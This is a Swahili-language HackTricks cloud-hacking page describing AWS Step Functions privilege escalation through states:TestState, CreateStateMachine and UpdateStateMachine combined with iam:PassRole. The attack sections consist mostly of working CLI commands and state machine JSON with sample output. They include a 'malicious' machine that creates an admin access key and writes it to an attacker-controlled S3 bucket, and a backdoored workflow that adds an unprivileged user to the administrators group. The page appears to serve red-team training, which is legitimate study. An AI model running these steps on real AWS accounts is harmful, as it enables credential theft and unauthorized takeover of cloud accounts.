# AWS - Kupandisha Hadhi ya Step Functions

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Hatua za Kazi

Kwa habari zaidi kuhusu huduma hii ya AWS, angalia:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Mshambuliaji mwenye ruhusa za **`states:TestState`** & **`iam:PassRole`** anaweza kujaribu hali yoyote na kumpitisha jukumu lolote la IAM kwake bila kujenga au kusasisha mashine ya hali iliyopo, kuruhusu ufikiaji usioruhusiwa kwa huduma zingine za AWS na ruhusa za majukumu. Kwa pamoja, ruhusa hizi zinaweza kusababisha hatua nyingi zisizoidhinishwa, kuanzia kubadilisha mchakato wa kazi hadi kubadilisha data, uvujaji wa data, upangishaji wa rasilimali, na kupandisha hadhi.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
```json
{
    "Comment": "Create an access key for the admin user",
    "StartAt": "CreateAccessKey",
    "States": {
        "CreateAccessKey": {
            "Type": "Task",
            "Resource": "arn:aws:states:::iam:createAccessKey",
            "End": true
        }
    }
}
```
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Amri** iliyotekelezwa kufanya privesc:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Madhara Yanayowezekana**: Utekelezaji usiohalali na upangaji wa mifumo ya kazi na ufikiaji wa rasilimali nyeti, huku ukiweza kusababisha uvunjaji mkubwa wa usalama.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Mshambuliaji mwenye **`states:CreateStateMachine`** & **`iam:PassRole`** angekuwa na uwezo wa kuunda mashine ya hali na kumpa jukumu lolote la IAM, kuruhusu ufikiaji usiohalali wa huduma zingine za AWS na ruhusa za majukumu. Tofauti na mbinu ya awali ya upandishaji wa mamlaka (**`states:TestState`** & **`iam:PassRole`**), hii haitekelezi yenyewe, utahitaji pia kuwa na ruhusa za **`states:StartExecution`** au **`states:StartSyncExecution`** (**`states:StartSyncExecution`** haipatikani kwa mifumo ya kazi ya kawaida, **tu kwa mashine za hali za kueleza**) ili kuanza na utekelezaji juu ya mashine ya hali.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Mifano ifuatayo zinaonyesha jinsi ya kuunda mashine ya hali ambayo inaunda ufunguo wa ufikiaji kwa mtumiaji wa **`admin`** na kufichua ufunguo huu wa ufikiaji kwa kikasha cha S3 kinachodhibitiwa na mshambuliaji, ikiboresha ruhusa hizi na jukumu lenye ruhusa nyingi katika mazingira ya AWS. Jukumu hili lenye ruhusa nyingi linapaswa kuwa na sera yoyote yenye ruhusa kuu iliyounganishwa nayo (kwa mfano **`arn:aws:iam::aws:policy/AdministratorAccess`**) ambayo inaruhusu mashine ya hali kutekeleza vitendo vya **`iam:CreateAccessKey`** & **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Amri** iliyotekelezwa kujenga **mtambo wa hali**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Amri** iliyotekelezwa kuanza **utekelezaji** wa mashine ya hali iliyoundwa hapo awali:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

Kisanduku cha S3 kinachodhibitiwa na mshambuliaji kinapaswa kuwa na ruhusa ya kukubali hatua ya s3:PutObject kutoka kwenye akaunti ya mwathiriwa.

{% endhint %}

- **Matokeo Yanayowezekana**: Utekelezaji usiohalali na upangaji wa mifumo ya kazi na ufikiaji wa rasilimali nyeti, ukiweza kusababisha uvunjaji mkubwa wa usalama.

### `states:UpdateStateMachine` & (sio lazima kila wakati) `iam:PassRole`

Mshambuliaji mwenye ruhusa ya **`states:UpdateStateMachine`** angekuwa na uwezo wa kubadilisha ufafanuzi wa mashine ya hali, akiweza kuongeza hali za siri zaidi ambazo zinaweza kusababisha ongezeko la mamlaka. Kwa njia hii, wakati mtumiaji halali anaanza utekelezaji wa mashine ya hali, hali hii mpya ya siri ya ujanja itatekelezwa na ongezeko la mamlaka litafanikiwa.

Kulingana na jinsi jukumu la IAM lilivyo na upana, linalohusishwa na mashine ya hali, mshambuliaji angekutana na hali 2:

1. **Jukumu la IAM lenye Upole**: Ikiwa jukumu la IAM linalohusishwa na mashine ya hali tayari ni lenye upole (kwa mfano lina sera ya **`arn:aws:iam::aws:policy/AdministratorAccess`** iliyowekwa), basi ruhusa ya **`iam:PassRole`** haitahitajika ili kuongeza mamlaka kwani haitakuwa muhimu pia kusasisha Jukumu la IAM, na ufafanuzi wa mashine ya hali unatosha.
2. **Jukumu la IAM Lisilokuwa na Upole**: Tofauti na kesi iliyopita, hapa mshambuliaji pia atahitaji ruhusa ya **`iam:PassRole`** kwani itakuwa muhimu kuunganisha Jukumu la IAM lenye upole kwa mashine ya hali mbali na kubadilisha ufafanuzi wa mashine ya hali.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Mifano ifuatayo zinaonyesha jinsi ya kusasisha mashine halali ya hali ambayo inaita tu kazi ya Lambda ya HelloWorld, ili kuongeza hali ya ziada ambayo inaongeza mtumiaji **`unprivilegedUser`** kwa Kikundi cha IAM cha **`administrator`**. Kwa njia hii, wakati mtumiaji halali anaanza utekelezaji wa mashine ya hali iliyosasishwa, hali hii mpya ya siri ya udukuzi itatekelezwa na ukuaji wa mamlaka utafanikiwa.

{% hint style="warning" %}

Ikiwa mashine ya hali haina Jukumu la IAM lenye ruhusa, pia itahitajika ruhusa ya **`iam:PassRole`** kusasisha Jukumu la IAM ili kuunganisha Jukumu la IAM lenye ruhusa (kwa mfano moja na sera ya **`arn:aws:iam::aws:policy/AdministratorAccess`** iliyowekwa).

{% endhint %}

{% tabs %}

{% tab title="Mashine Halali ya Hali" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Mashine ya Hali ya Hewa iliyosasishwa kwa Nia Mbaya" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **Amri** iliyotekelezwa kuboresha mashine halali ya hali**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Athari Inayowezekana**: Utekelezaji usiohalali na udanganyifu wa mifumo ya kazi na ufikiaji wa rasilimali nyeti, huku ukiweza kusababisha uvunjaji mkubwa wa usalama.

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
